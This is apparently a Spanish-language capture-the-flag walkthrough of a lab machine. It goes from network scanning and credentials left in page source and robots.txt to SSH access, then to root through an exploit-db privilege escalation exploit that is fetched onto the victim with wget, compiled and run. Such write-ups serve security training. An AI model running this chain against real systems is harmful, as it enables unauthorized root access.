**1.- Escaneo de la red local:**
Para escanear la red local para identifica la IP de la máquina, para ello usaremos el siguiente comando:

arp-scan --localnet
<img src="Pasted image 20240225101807.png">

**2.- Escanear puertos abiertos:**
Para poder ver los puertos abiertos de la maquina hay que usar el siguiente comando:

nmap -sS -sV (ip de la máquina)
<img src="Pasted image 20240225102213.png">

Al ver que hay el puerto 80 abierto, vemos que equivale al protocolo HTTP y eso es una web.

**3.- Abrimos la web en el navegador:**
Para abrir la web hay que introducir la IP de la máquina en el navegador.
<img src="Pasted image 20240225103209.png">

Una vez la hemos abierto vamos a ver el código fuente le daremos click derecno y a view page source. 
<img src="Pasted image 20240225103613.png">

Podemos ver abajo de todo que nos da el usuario.

Seguindamente iremos a la pagina web i escribiremos al lado de la ip /robots.txt que esto nos puede dar pistas de donde esta ubicaedo el sitemap de la web.
<img src="Pasted image 20240225103908.png">

Vemos que nos da algo cifrado, al ver que contiene numeros, mayusculas, minusculas deducimos que es un hash en base 64. entonces lo vamos a descifrar.

**4.- Descifrar el hash:**

Para descifrar el hash introduciremos el siguiente comando.
<img src="Pasted image 20240225104221.png">

Al descifrarlo vemos que nos da la primera flag. Lo mejor de todo esque esta es la password del usuario que hemos visto anteriormente.

Entonces, recordando que al hacer el escaneo de puetos hemos visto que podriamos entrar via el protocolo ssh.

**5.- Entrar en la máquina por ssh:**
Para entrar via ssh a una máquina hay que escribir el siguiente comando.

ssh usuario@ip
<img src="Pasted image 20240225104841.png">

Una vez entramos nos queda encontrar 2 flags, miraremos si hay algún archivo que nos indique donde podemos encontrar las siguienters flags. Entonces escribiremos los siguientes comandos.
<img src="Pasted image 20240225105208.png">
Podemos ver que hay el archivo flag2.txt nos muestra el la flag en binario, por lo tanto para saber el contenido de esta en ascii, nos tendremos que generar el siguiente script para traducirlo.
<img src="Pasted image 20240225105619.png">

Ahora ejecutamos el script con el sigiente comando.
python3 (nombre archivo).py
<img src="Pasted image 20240225105706.png">

Ya tenemos dos flags, solo nos queda escalar privilegios y conseguir la flag del usuario root (administrador).

**6.- Escalada de privilegios:**

Para escalar privilegios primero tenemos que mirar que permisos tenemos como usuario. Para ello, escribimos el siguiente comando.

find / -perm -u=s -type f 2>/dev/null
<img src="Pasted image 20240225110032.png">
Al ver que con estos permisisos no podemos escalar, debemos mirar la version del sistema operativo para ver si es muy anterior y asi podemos buscar un script o programarlo.

lsb_release -a
<img src="Pasted image 20240225110243.png">
Al ver que la version de ubunto es muy antigua, entonces buscaremos el script para escalar privilegios.
Descargamos el exploit de esta url: https://www.exploit-db.com/exploits/37292

Al tenerlo en la máquina atacante, hay enviarseolo a la máquina víctima, para ello montaremos un servidor python.

python3 -m http.server 80
<img src="Pasted image 20240225110710.png">

Lo descargaremos desde la máquina victima usando el siguiente comando.

wget (ip)/(nombre archivo)
<img src="Pasted image 20240225110817.png">

**7.- Ejecutar y encontrar la flag:**
Para ejecutar el script hay que escribir los siguientes comandos:
1. Primero hay que compilarlo:

gcc -o (nombre que quieres renombrar para ejecutar) (archivo).c
<img src="Pasted image 20240225110943.png">
2. Seguidamente hay que ejecutarlo:

./(nombre del archivo compilado)
<img src="Pasted image 20240225111057.png">

Con estso ya somos usuario root.

whoami
<img src="Pasted image 20240225111124.png">
Para mostrar las rutas hay que escribir el siguiente comando:

script /dev/null -c bash
<img src="Pasted image 20240225111333.png">

Ahora ya solo nos queda ir al carpeta del usuario root y encontrar la falg.
<img src="Pasted image 20240225111431.png">
